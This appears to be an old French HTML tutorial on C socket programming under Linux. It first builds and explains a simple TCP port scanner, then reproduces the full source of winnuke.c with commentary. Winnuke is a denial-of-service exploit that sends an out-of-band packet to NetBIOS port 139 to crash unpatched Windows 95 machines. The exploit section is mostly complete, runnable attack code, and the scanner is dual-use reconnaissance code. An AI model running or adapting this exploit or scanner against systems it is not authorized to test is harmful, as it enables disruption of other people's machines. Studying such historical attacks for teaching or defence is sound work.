@@ -1,0 +1,330 @@
+<html>
+<head>
+<title>Les sockets en C sous Linux</title>
+<meta name="Description" content="">
+<meta name="Keywords" content="">
+</head>
+<body bgcolor="#FFFFF8" text="#000000" link="#339966" vlink="#339966" alink="#339966">
+<table width="283" border="0" cellspacing="0" cellpadding="0" background="IMAGES/fnd_stitre.jpg" height="40">
+  <tr> 
+    <td width="23">&nbsp;</td>
+    <td width="294"><font face="Verdana, Arial, Helvetica, sans-serif" color="#FFCC00"><font color="#CCCCCC" size="2"> 
+      LES SOCKETS EN C SOUS LINUX </font></font></td>
+  </tr>
+</table>
+<p><br>
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Les sockets 
+  en C sous linux </u></b></font><br>
+  <br>
+  <font face="Verdana" size=2>Dans cet article je vais vous expliquer les bases 
+  de la programmation des sockets en C sous LINUX, il vous faudra donc une connaissance 
+  minimale du C et le syst&egrave;me Linux ou tout autre UNIX sur votre pc. <br>
+  <br>
+  Avant de commencer, quelques rappel pour &eacute;diter et compiler un fichier 
+  sous linux. Pour &eacute;diter un fichier, tapez: <font face="Courier New" color="#000080"><i>vi 
+  &lt;nom_du_fichier.c&gt;</i></font>. Pour y ins&eacute;rer du texte tapez :i, 
+  pour l'enregistrer tapez :w et pour quitter tapez :q ou :q! (si vous ne souhaitez 
+  pas enregistrer le fichier avant). Pour compiler votre fichier .c rien de plus 
+  simple tapez: <font face="Courier New" color="#000080"><i>gcc &lt;nom_du_fichier.c&gt; 
+  -o &lt;nom_du_fichier&gt;</i></font>. Une fois compil&eacute;, vous pourrez 
+  &eacute;x&eacute;cuter le programme en tapant: <font face="Courier New" color="#000080"><i>./nom_du_fichier</i></font>. 
+  Voil&agrave; pour les commandes minimale &agrave; conna&icirc;tre pour suivre 
+  cet article. <br>
+  <br>
+  Ici, nous allons cr&eacute;er un scanner de ports. Chouette me direz vous... 
+  Oui sauf qu'il n'est l&agrave; qu'&agrave; titre d'exemple et que la m&eacute;thode 
+  utilis&eacute;e n'est en aucun cas la meilleur et la plus rapide. <br>
+  Il est coutume de comparer les sockets au t&eacute;l&eacute;phone, lorsque vous 
+  souhaitez t&eacute;l&eacute;phoner, vous installez tout d'abord le t&eacute;l&eacute;phone, 
+  puis ensuite vous d&eacute;crochez, vous composez le num&eacute;ro de t&eacute;l&eacute;phone 
+  &agrave; appeller et vous echangez des donn&eacute;es (en parlant). Pour les 
+  sockets le principe est le m&ecirc;me, vous d&eacute;clarez une socket (installation), 
+  vous allez remplir une structure contenant les informations de l'ordinateur 
+  &agrave; appeller (num&eacute;ro de t&eacute;l&eacute;phone) et ensuite &eacute;changer 
+  des donn&eacute;es (parler). Pour cet article, l'&eacute;change de donn&eacute;es 
+  ne sera pas expliqu&eacute; (il n'est pas n&eacute;cessaire dans l'exemple car 
+  ce n'est pas un client serveur). <br>
+  Je vais directement vous donner le code source que je commenterai plus loin: 
+  <font face="Courier New"> <br>
+  <br>
+  <br>
+  /* scan.c by alecs */ <br>
+  #include &lt;stdio.h&gt; <br>
+  #include &lt;sys/socket.h&gt; <br>
+  #include &lt;sys/types.h&gt; <br>
+  #include &lt;netinet/in.h&gt; <br>
+  #include &lt;netdb.h&gt; <br>
+  #include &lt;stdlib.h&gt; <br>
+  #include &lt;unistd.h&gt; <br>
+  #include &lt;string.h&gt; <br>
+  <br>
+  int main(int argc, char *argv[]) <br>
+  { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; int sck; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in adsck; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; struct hostent *hptr; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; char *host; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; int port; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; int first_port; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; int last_port; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; if(argc != 4) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("usage: %s &lt;host&gt; 
+  &lt;first_port&gt; &lt;last_port&gt;\n", argv[0]); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; host = argv[1]; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; first_port = atoi(argv[2]); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; last_port = atoi(argv[3]); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; if((hptr = gethostbyname(host)) == NULL) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("invalide host\n"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("gethostbyname()"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; adsck.sin_family = AF_INET; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; bcopy((char *)hptr-&gt;h_addr, (char *)&adsck.sin_addr, 
+  hptr-&gt;h_length); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; for(port = first_port; port &lt;= last_port; port++) 
+  { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adsck.sin_port = htons(port); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((sck = socket(AF_INET, SOCK_STREAM, 
+  0)) &lt; 0) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("can't 
+  create the socket"); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("socket()"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((connect(sck, (struct sockaddr 
+  *) &adsck, sizeof(adsck))) &lt; 0) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+  nop */ <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%d 
+  ", port); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sck); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; printf("\n"); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; exit(0); <br>
+  } <br>
+  <br>
+  <font face="Verdana"><br>
+  Voil&agrave; ledit programme, maintenant petite expliquation:</font> <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; if(argc != 4) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("usage: %s &lt;host&gt; 
+  &lt;first_port&gt; &lt;last_port&gt;\n", argv[0]); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  <font face="Verdana"><br>
+  Ici rien de bien compliqu&eacute;, on verifie le nombre d'arguments pass&eacute;s 
+  en ligne de commande qui doit &ecirc;tre 1 (le nom du programme) + 3 autres.</font> 
+  <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; host = argv[1]; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; first_port = atoi(argv[2]); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; last_port = atoi(argv[3]); <br>
+  <font face="Verdana"><br>
+  On attribut &agrave; host le nom de l'ordinateur auquel se connecter (on donnera 
+  le plus souvent une adresse ip). Ensuite on initialise first_port et last_port 
+  qui seront les limites des ports &agrave; scanner, ici on utilise atoi() pour 
+  convertir le type char * (argv[2] et argv[3]) en int (qui est le type des variable 
+  qui vont contenir argv[2] et argv[3]).</font> <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; if((hptr = gethostbyname(host)) == NULL) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("invalide host\n"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("gethostbyname()"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  <font face="Verdana"><br>
+  La fonction gethostbyname() va remplir la structure hptr et directement convertir 
+  host en big endian qui est en gros le type universel qui permet &agrave; n'importe 
+  quel machine sur l'internet de communiquer avec une autre. Petite expliquation 
+  de perror(): cette fonction r&eacute;cup&egrave;re l'erreur qui est dans le 
+  stderr pour ensuite l'afficher &agrave; l'&eacute;cran.</font> <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; adsck.sin_family = AF_INET; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; bcopy((char *)hptr-&gt;h_addr, (char *)&adsck.sin_addr, 
+  hptr-&gt;h_length); <br>
+  <font face="Verdana"><br>
+  Ici on remplit la structure adsck. Tout d'abord on indique la famille d'adresse, 
+  ici AF_INET (protocole Internet). Ensuite on utilise bcopy() pour copier les 
+  informations de la structure hptr (que nous avons rempli avec gethostbyname() 
+  !) vers adsck.sin_addr qui contiendra donc l'ip de la machine h&ocirc;te (en 
+  gros ;)).</font> <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; for(port = first_port; port &lt;= last_port; port++) 
+  { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adsck.sin_port = htons(port); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((sck = socket(AF_INET, SOCK_STREAM, 
+  0)) &lt; 0) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("can't 
+  create the socket"); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("socket()"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((connect(sck, (struct sockaddr 
+  *) &adsck, sizeof(adsck))) &lt; 0) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+  nop */ <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%d 
+  ", port); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sck); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; } <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; printf("\n"); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; exit(0); <br>
+  <br>
+  <font face="Verdana">Bon l&agrave; c'est la boucle qui va tenter des connexions 
+  sur chaques ports de la machine pour les scanner. Encore une fois je vous r&eacute;p&egrave;te 
+  que ce n'est en aucun cas la bonne m&eacute;thode et elle est lente :). <br>
+  Avant d'essayer de se connecter, on indique le port sur lequel on veut se connecter 
+  (adsck.sin_port = htons(port);) on remplit donc la variable sin_port de notre 
+  structure avec le port courant (celui qui est incr&eacute;ment&eacute; &agrave; 
+  chaque it&eacute;ration) en le convertissant avec htons() (conversion en big 
+  endian toujours). Ensuite on cr&eacute; la socket avec la fonction socket() 
+  en lui passant la famille (AF_INET), le type (SOCK_STREAM pour le TCP) et le 
+  protocole qui est le plus souvent mis &agrave; 0 (NULL). Maintenant que la socket 
+  est cr&eacute;&eacute;e, nous pouvons nous connecter avec la fonctions connect(). 
+  On lui indique le socket, la structure qui contient les informations sur l'h&ocirc;te 
+  (dont l'adresse) et la taille de la structure. Si il y a connexion (enfin en 
+  liste d'attente) c'est que le port &eacute;tait en &eacute;coute et qu'il &eacute;tait 
+  donc ouvert, dans le cas contraire c'est qu'il est ferm&eacute;. On ferme alors 
+  la socket et on recommence au port suivant. <br>
+  <br>
+  <br>
+  <br>
+  </font></font></font><font face="Verdana" size=2><font face="Courier New"><font face="Verdana"><font face="Verdana" size=5><b> 
+  <u><font size="2">Explication de Winnuke</font></u></b></font></font></font></font></p>
+<p><font face="Verdana" size=2><font face="Courier New"><font face="Verdana">Pour 
+  ceux qui ne le saurait pas encore (mieux vaut tard que jamais), winnuke est 
+  un programme qui permet de lancer une attaque de type Denial of Service (DoS) 
+  sur une machine &eacute;quip&eacute;e de windows3.x ou windows95 principalement. 
+  Ici je vais vous expliquer comment fonctionne ce programme et surtout pourquoi. 
+  Pour ceux qui connaissent d&eacute;j&agrave; les sockets, la compr&eacute;hension 
+  du code ne sera pas difficile mais si vous n'avez lu que mon article, une petite 
+  explication s'impose. Lorsque winnuke lance une attaque, il se connecte au port 
+  NetBios du pc (&eacute;quip&eacute; d'un OS non prot&eacute;g&eacute; contre 
+  cette attaque), ensuite il envois un paquet sp&eacute;cial sur ce port, ce paquet 
+  est "hord bande" (out of band/OOB). Cela signifie que c'est une donn&eacute;e 
+  urgente qui passe avant les autres datagrammes qui ne sont pas out of band. 
+  Le probl&egrave;me vient du fait que windows95 ne sait pas g&eacute;rer de tels 
+  paquets, et lorsqu'il en re&ccedil;ois cela provoque une erreur fatale (ce qui 
+  fait en gros planter votre pc). Voil&agrave; le code source en question que 
+  j'ai comment&eacute;: <font face="Courier New"&gt;
+><br>
+  <br>
+  <br>
+  /* winnuke.c - (05/07/97) By _eci */ <br>
+  /* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */ <br>
+  #include &lt;stdio.h&gt; <br>
+  #include &lt;string.h&gt; <br>
+  #include &lt;netdb.h&gt; <br>
+  #include &lt;netinet/in.h&gt; <br>
+  #include &lt;sys/types.h&gt; <br>
+  #include &lt;sys/socket.h&gt; <br>
+  #include &lt;unistd.h&gt; <br>
+  <br>
+  #define dport 139 /* Port NetBios sur lequel lancer l'attaque DoS */ <br>
+  <br>
+  int x, s; <br>
+  /* C'est la chaine de caractere &agrave; envoyer en OOB apres la connexion, 
+  son contenu n'a aucune importance */ <br>
+  char *str = "Bye"; <br>
+  /* cf. mon article sur les sockets... */ <br>
+  struct sockaddr_in addr, spoofedaddr; <br>
+  struct hostent *host; <br>
+  <br>
+  int open_sock(int sock, char *server, int port) <br>
+  { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;/* cf. mon article sur les sockets... */ <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;struct sockaddr_in blah; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;struct hostent *he; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;bzero((char *)&blah,sizeof(blah)); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;blah.sin_family=AF_INET; <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;blah.sin_addr.s_addr=inet_addr(server); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;blah.sin_port=htons(port); <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;/* cf. mon article sur les sockets... */ <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;if ((he = gethostbyname(server)) != NULL) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bcopy(he-&gt;h_addr, (char *)&blah.sin_addr, 
+  he-&gt;h_length); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;} <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;else { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((blah.sin_addr.s_addr = 
+  inet_addr(server)) &lt; 0) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("gethostbyname()"); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return(-3); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;} <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;if (connect(sock,(struct sockaddr *)&blah,16)==-1) { 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("connect()"); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close(sock); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return(-4); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;} <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;printf("Connected to [%s:%d].\n",server,port); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;return; <br>
+  } <br>
+  <br>
+  void main(int argc, char *argv[]) <br>
+  { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;if (argc != 2) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Usage: %s &lt;target&gt;\n",argv[0]); 
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;} <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;/* cf. mon article sur les sockets... */ <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) 
+  == -1) { <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror("socket()"); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(-1); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;} <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;open_sock(s,argv[1],dport); <br>
+  <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;printf("Sending crash... "); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;/* Ici on envoi le paquet contenant la chaine de caractere 
+  en message hord bande (out of band) <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; * ce qui provoque le plantage de la machine cible si 
+  elle est pas prot&eacute;g&eacute; contre ce type <br>
+  &nbsp;&nbsp;&nbsp;&nbsp; * d'attaques */ <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;send(s,str,strlen(str),MSG_OOB); <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;/* usleep permet de suspendre l'application pendant 
+  x microsecondes (ici 100000), ce qui permettra de<br>
+  &nbsp;&nbsp;&nbsp;&nbsp; * ne pas stopper le programme trop brutalement */<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;usleep(100000);<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;printf("Done!\n");<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;close(s);<br>
+  }<br>
+  <br>
+  <font face="Verdana" size=2><br>
+  Voil&agrave;, je n'ai pratiquement rien comment&eacute; car ce DoS est ultra 
+  simple et vous pouvez comprendre le code source sans probl&egrave;me si vous 
+  vous r&eacute;f&eacute;rez &agrave; mon article sur les sockets (plus haut).</font> 
+  </font></font></font></font></p>
